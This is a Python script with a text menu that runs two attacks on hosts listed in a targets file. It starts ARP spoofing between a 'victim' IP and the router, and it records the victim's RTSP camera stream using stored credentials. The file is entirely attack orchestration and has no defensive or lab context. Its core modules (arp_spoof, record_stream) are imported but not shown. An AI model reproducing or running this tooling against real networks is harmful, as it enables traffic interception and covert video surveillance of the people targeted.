import threading
from time import sleep

class TargetLoader:
    def __init__(self, filepath):
        self.filepath = filepath

    def load_targets(self):
        """Load target information from the file."""
        config = {}
        with open(self.filepath, 'r') as file:
            for line in file:
                key, value = line.split('=')
                config[key.strip()] = value.strip()
        return config

class Menu:
    def __init__(self):
        self.loader = TargetLoader('targets.txt')
        self.running_tasks = []

    def run_arp_spoofing(self):
        from arp_spoof import ArpSpoofManager
        target_info = self.loader.load_targets()
        victim_ip = target_info['victim']
        router_ip = target_info['router']
        spoofer = ArpSpoofManager(victim_ip, router_ip)
        spoof_thread = threading.Thread(target=spoofer.run)
        spoof_thread.start()
        self.running_tasks.append(spoof_thread)
        print("ARP spoofing started...")

    def run_network_recording(self):
        from record_stream import StreamRecorder
        target_info = self.loader.load_targets()
        victim_ip = target_info['victim']
        username = target_info['username']
        password = target_info['password']
        url = f"rtsp://{username}:{password}@{victim_ip}/channel1"

        recorder = StreamRecorder(url, format='mkv')
        record_thread = threading.Thread(target=recorder.record)
        record_thread.start()
        self.running_tasks.append(record_thread)
        print("Network recording started...")

    def display_menu(self):
        print("Select an option:")
        print("1. Run ARP Spoofing")
        print("2. Run Network Recording")
        print("3. Stop all tasks and Exit")

    def execute_choice(self, choice):
        if choice == '1':
            self.run_arp_spoofing()
        elif choice == '2':
            self.run_network_recording()
        elif choice == '3':
            for task in self.running_tasks:
                if task.is_alive():
                    task.join()  # Wait for the task to finish if it's still running
            print("Exiting program.")
            exit()
        else:
            print("Invalid choice. Please try again.")

def main():
    menu = Menu()
    while True:
        menu.display_menu()
        choice = input("Enter your choice: ")
        menu.execute_choice(choice)

if __name__ == "__main__":
    main()
